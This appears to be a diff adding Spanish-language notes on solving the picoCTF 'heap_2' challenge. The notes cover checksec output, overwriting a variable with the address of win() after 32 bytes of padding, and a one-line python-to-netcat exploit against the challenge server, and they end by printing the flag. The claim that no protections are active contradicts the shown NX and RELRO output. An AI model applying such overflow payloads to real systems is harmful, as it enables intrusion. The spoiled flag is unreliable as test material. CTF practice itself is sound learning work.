@@ -1,0 +1,31 @@
+# Notas de Heap_2
+
+Bàsicamente hay que hacer un salto a una funciòn que se llama win. En el menu se llama a esta funciòn
+
+void check_win() { ((void (*)())*(int*)x)(); }
+
+Primero verificamos con checksec que no tenga ninguna defensa activada.
+
+   Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+No hay nada activado, entonces tenemos terreno libre.
+
+Que lo que hay que sobrescribir es la variable x. De donde escribimos a x hay 32 bytes.
+Rellenamos los 32 bytes y escribimos la direcciòn de la funciòn win(), que la descrubrimos con GDB.
+La direcciòn es la siguiente:
+
+0x004011a0
+
+La escribimos en little endian porque es x86, y el exploit serìa el siguiente:
+
+python -c 'import sys; sys.stdout.buffer.write(b"\x32\x0a" + (b"\x41") * 32 + b"\xa0\x11\x40\x00\x0a\x34\x0a")' | nc mimas.picoctf.net 58739
+
+Y tenemos la flag:
+
+picoCTF{and_down_the_road_we_go_904e3edd}
